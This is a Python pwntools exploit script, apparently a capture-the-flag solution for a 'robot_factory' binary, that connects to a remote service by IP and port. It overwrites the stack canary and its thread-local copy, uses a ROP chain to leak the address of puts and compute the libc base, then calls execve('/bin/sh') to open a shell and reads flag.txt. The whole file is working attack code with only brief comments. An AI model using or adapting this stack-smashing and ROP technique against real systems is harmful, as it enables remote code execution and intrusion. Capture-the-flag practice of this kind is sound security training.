from pwn import *

context.binary = "robot_factory"
libc = ELF("libc.so.6")

conn = remote("64.227.40.93", 30215)

canary_offset = 5
canary_offset_tls = 21
payload_len = 28
repeat = 11

def build_payload(rop):
    canary = cyclic(8)

    payload = flat({
        canary_offset * 8: canary,
        (canary_offset + 2) * 8: rop,
        canary_offset_tls * 8: canary,
        payload_len * 8: []
    })

    assert len(payload) == payload_len * 8

    return payload

# Because we have a completely broken stack and we can't
# simply exit to avoid termination we can just sleep long
# enough for the rest of the exploit to run.

# puts(puts_got_entry)
# sleep(50)
rop = ROP(context.binary)
rop.puts(context.binary.got["puts"])
rop.sleep(50)
payload = build_payload(rop)

# Select a robot to trigger the rop.
conn.sendlineafter(b"> ", b"s")
conn.sendlineafter(b"> ", b"m")
conn.sendlineafter(b": ", payload)
conn.sendlineafter(b": ", str(repeat).encode())

# Compute the libc base address.
conn.recvuntil(b"> ")
leak = conn.recvline()
leak = leak[:-1]
leak = leak.ljust(8, b'\0')
leak = u64(leak)
libc.address = leak - libc.symbols["puts"]

# execve("/bin/sh", 0, 0)
# sleep(50)
rop = ROP(libc)
rop.call(libc.symbols["execve"], [next(libc.search(b"/bin/sh")), 0, 0])
rop.sleep(50)
payload = build_payload(rop)

# Select a robot to trigger the rop.
conn.sendline(b"s")
conn.sendlineafter(b"> ", b"m")
conn.sendlineafter(b": ", payload)
conn.sendlineafter(b": ", str(repeat).encode())

# Print the flag.
conn.recvuntil(b"> ")
conn.sendline(b"cat flag.txt")
log.success(conn.recvlineS())
